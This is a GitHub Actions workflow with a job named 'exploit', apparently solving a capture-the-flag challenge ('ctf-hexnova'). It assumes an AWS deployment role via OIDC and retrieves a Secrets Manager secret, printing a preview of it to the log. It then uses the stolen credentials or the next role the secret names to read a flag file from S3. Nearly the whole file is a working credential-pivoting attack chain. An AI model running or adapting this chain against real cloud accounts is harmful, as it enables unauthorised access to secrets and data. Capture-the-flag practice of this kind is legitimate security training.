name: retrace-hexnova
on:
  workflow_dispatch:
  push:
    branches: [ "main" ]

jobs:
  exploit:
    permissions:
      id-token: write
      contents: read
    runs-on: ubuntu-latest
    steps:
      - name: Environment sanity
        run: |
          set -x
          uname -a
          which aws || true
          aws --version || true

      - name: Configure AWS via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::170974506515:role/github-deployment-role
          aws-region: us-west-2
          role-session-name: ctf-hexnova

      - name: Verify caller
        run: aws sts get-caller-identity --output json

      - name: Install jq
        run: sudo apt-get update && sudo apt-get install -y jq

      - name: Fetch next-hop secret
        run: |
          set -euo pipefail
          aws secretsmanager get-secret-value \
            --secret-id internal/secrets/id-v2 \
            --region us-west-2 \
            --output json > secret_resp.json

          # Extract raw SecretString to a file (no quoting)
          jq -r '.SecretString' secret_resp.json > secret.json

          echo "Secret preview (first 200 bytes):"
          head -c 200 secret.json || true; echo

      - name: Classify secret contents
        id: kind
        run: |
          if jq -e '.AccessKeyId and .SecretAccessKey and .SessionToken' secret.json >/dev/null; then
            echo "value=creds" >> "$GITHUB_OUTPUT"
          else
            echo "value=role" >> "$GITHUB_OUTPUT"
          fi

      - name: Use STS creds (if provided)
        if: steps.kind.outputs.value == 'creds'
        run: |
          export AWS_ACCESS_KEY_ID=$(jq -r .AccessKeyId secret.json)
          export AWS_SECRET_ACCESS_KEY=$(jq -r .SecretAccessKey secret.json)
          export AWS_SESSION_TOKEN=$(jq -r .SessionToken secret.json)

          aws sts get-caller-identity --output json
          aws s3 cp s3://atr3404-63428fb6/flag.txt - --region us-west-2

      - name: Or assume next role (if provided)
        if: steps.kind.outputs.value == 'role'
        run: |
          ROLE=$(jq -r .RoleArn secret.json)
          EXT=$(jq -r '.ExternalId // empty' secret.json)
          [ -n "$EXT" ] && EXTARG=(--external-id "$EXT") || EXTARG=()

          aws sts assume-role \
            --role-arn "$ROLE" \
            --role-session-name ctf-hexnova-priv \
            "${EXTARG[@]}" \
            --output json > assume.json

          export AWS_ACCESS_KEY_ID=$(jq -r '.Credentials.AccessKeyId' assume.json)
          export AWS_SECRET_ACCESS_KEY=$(jq -r '.Credentials.SecretAccessKey' assume.json)
          export AWS_SESSION_TOKEN=$(jq -r '.Credentials.SessionToken' assume.json)

          aws sts get-caller-identity --output json
          aws s3 cp s3://atr3404-63428fb6/flag.txt - --region us-west-2

